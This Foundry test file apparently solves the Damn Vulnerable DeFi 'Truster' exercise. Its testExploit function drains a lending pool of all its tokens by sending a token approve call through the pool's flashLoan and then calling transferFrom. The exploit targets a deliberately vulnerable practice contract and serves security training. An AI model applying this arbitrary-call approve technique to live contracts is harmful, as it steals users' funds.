// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.4;

import "forge-std/Test.sol";
import "src/truster/TrusterLenderPool.sol";
import "src/DamnValuableToken.sol";



/// https://book.getfoundry.sh/forge/writing-tests
contract Truster is Test {


    uint256 internal constant TOKENS_IN_POOL = 1000000 ether;
    DamnValuableToken internal damnValuableToken;
    TrusterLenderPool internal trusterLenderPool;

    address internal deployer;
    address internal attacker;
    address internal someUser;

    function setUp() public {
        // solhint-disable-previous-line no-empty-blocks
        deployer = vm.addr(1);
        vm.label(deployer, "deployer");
        attacker = vm.addr(2);
        vm.label(attacker, "attacker");
        someUser = vm.addr(3);
        vm.label(someUser, "someUser");

        damnValuableToken = new DamnValuableToken();
        vm.label(address(damnValuableToken), "damnValuableToken");
        trusterLenderPool = new TrusterLenderPool(address(damnValuableToken));
        vm.label(address(damnValuableToken), "trusterLenderPool");

        damnValuableToken.transfer(address(trusterLenderPool), TOKENS_IN_POOL);

        assertEq(damnValuableToken.balanceOf(address(trusterLenderPool)), TOKENS_IN_POOL);
    }


    /// @dev Run Forge with `-vvvv` to see console logs.
    function testExploit() public {

        vm.startPrank(attacker);
        bytes memory data = abi.encodeWithSelector(damnValuableToken.approve.selector, attacker, TOKENS_IN_POOL);
        trusterLenderPool.flashLoan(0, attacker, address(damnValuableToken), data);
        damnValuableToken.transferFrom(address(trusterLenderPool), attacker, TOKENS_IN_POOL);
        vm.stopPrank();
        validate();
    }

    function validate() internal {

        assertEq(damnValuableToken.balanceOf(address(trusterLenderPool)), 0);
        assertEq(damnValuableToken.balanceOf(address(attacker)), TOKENS_IN_POOL);

    }
}